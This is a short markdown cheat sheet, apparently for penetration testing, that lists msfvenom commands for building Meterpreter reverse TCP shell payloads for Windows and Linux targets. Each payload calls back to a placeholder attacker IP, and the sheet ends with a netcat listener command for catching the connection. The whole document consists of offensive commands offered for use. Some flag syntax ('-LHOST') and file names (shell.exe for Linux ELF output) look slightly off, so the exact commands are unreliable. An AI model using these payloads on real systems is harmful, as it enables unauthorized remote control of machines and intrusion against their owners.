# Reverse Shells

## Generate Reverse TCP Shell For Windows Target
`msfvenom -p windows/meterpreter/reverse_tcp -LHOST=<your-IP> -LPORT=4444 -f exe -o shell.exe`

## Generate Meterpreter Reverse TCP For Linux x64 (64-bit) Target
`msfvenom -p linux/x64/meterpreter/reverse_tcp -LHOST=<your-IP> -LPORT=4444 -f elf -o shell.exe`

## Generate Meterpreter Reverse TCP For Linux x86 (32-bit) Target
`msfvenom -p linux/x86/meterpreter/reverse_tcp -LHOST=<your-IP> -LPORT=4444 -f elf -o shell.exe`

## Listen For Reverse Shell Connection On Attacker Machine
`nc -lvnp 4444`
